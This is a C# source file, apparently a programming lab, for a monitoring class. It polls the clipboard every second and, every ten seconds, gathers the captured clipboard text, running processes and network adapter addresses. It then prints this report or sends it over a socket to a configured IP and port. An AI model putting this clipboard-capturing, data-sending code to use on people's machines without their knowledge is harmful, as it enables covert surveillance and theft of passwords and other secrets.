using System;
using System.Threading;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using Framework;
using static Framework.Logger;
using static Framework.Utilities;

namespace lab07
{

    public class Monitor
    {
        const string name = "Monitor";
        Queue<string> clipboard = new Queue<string>();
        FrwSemaphore clipboardlock = new FrwSemaphore(1, "clipboard");
        bool PrintOrSend;
        public Monitor(string ip, int port)
        {
            IPC.AddSocketMapping(name, ip, port);
        }

        public void StartMonitoring(bool PrintOrSend)
        {
            this.PrintOrSend = PrintOrSend;
            var t1 = new Thread(SendData);
            var t2 = new Thread(MonitorClipboard);
            t2.SetApartmentState(ApartmentState.STA);
            t2.IsBackground = false;
            t1.Start();
            t2.Start();
        }

        List<ProcessResponse> GenerateProcessReport()
        {
            var processes = Process.GetProcesses();
            var list = new List<ProcessResponse>();
            foreach (var it in processes)
            {
                var a = new ProcessResponse(it);
                list.Add(a);
            }
            return list;
        }

        List<NetworkResponse> GenerateNetworkReport()
        {
            var network = NetworkInterface.GetAllNetworkInterfaces();
            var list2 = new List<NetworkResponse>();
            foreach (var it in network)
            {
                var a = new NetworkResponse(it);
                list2.Add(a);
            }
            return list2;
        }

        List<string> GenerateClipboardReport()
        {
            var list = new List<string>();
            clipboardlock.Lock();
            foreach (var word in clipboard)
            {
                list.Add(word);
            }
            clipboard = new Queue<string>();
            clipboardlock.Unlock();
            return list;
        }

        void MonitorClipboard()
        {
            const string routine = "MonitorClipboard";
            Entering(name, routine);

            string lasttext = "";
            while (true)
            {
                clipboardlock.Lock();
                if (Clipboard.ContainsText())
                {
                    Debug(name, routine, "Clipboard has text.");
                    string newtext = Clipboard.GetText();
                    Debug(name, routine, $"Found: {newtext}.");
                    if (lasttext != newtext)
                    {
                        Debug(name, routine, "Previous and new not equal.");
                        clipboard.Enqueue(newtext);
                        Debug(name, routine, "Newtext enqueued.");
                        lasttext = newtext;
                    }
                    else
                    {
                        Debug(name, routine, "Same as last string.");
                    }
                }
                else
                {
                    Debug(name, routine, "Did not contain text.");
                }
                clipboardlock.Unlock();
                Thread.Sleep(1000);
            }
        }

        void SendData()
        {
            const string routine = "SendData";
            Entering(name, routine);

            while (true)
            {
                Thread.Sleep(10000);
                var rsp = new ReportResponse(GenerateClipboardReport(),
                                                GenerateProcessReport(),
                                                GenerateNetworkReport());
                if (!PrintOrSend)
                {
                    PrintData(rsp);
                }
                else
                {
                    IPC.SendWithNoResponse(name, rsp);
                }

            }
        }

        void PrintData(ReportResponse rsp)
        {
            const string routine = "SendData";
            Entering(name, routine);

            PrintLine("SYSTEM ACTIVITY REPORT:");
            PrintLine("   Clipboard contents:");
            if (IsGreaterThan(rsp.Clipboard.Count, 0))
            {
                foreach (var item in rsp.Clipboard)
                {
                    PrintLine($"      {item}");
                }
            }
            else
            {
                PrintLine("      NOTHING NEW!");
            }
            PrintLine("   Network adapters:");
            if (IsGreaterThan(rsp.Adapters.Count, 0))
            {
                foreach (var item in rsp.Adapters)
                {
                    PrintLine($"      Name:   {item.Name}");
                    PrintLine($"      Desc:   {item.Description}");
                    PrintLine($"      IPinfo:");
                    foreach (var address in item.IPInfo.UnicastAddresses)
                    {
                        PrintLine($"         {address.Address.ToString()}");
                    }
                }
            }
            else
            {
                PrintLine("      NO NETWORK ADAPTERS!");
            }
            PrintLine("   System Processes:");
            if (IsGreaterThan(rsp.Processes.Count, 0))
            {
                foreach (var item in rsp.Processes)
                {
                    PrintLine($"      System:     {item.SystemName}");
                    PrintLine($"      PName:      {item.Name}");
                    PrintLine($"      PID:        {item.Id}");
                    //PrintLine($"      PStartTime: {item.StartTime}");
                }
            }
            else
            {
                PrintLine("      NO PROCESSES!");
            }
        }
    }
}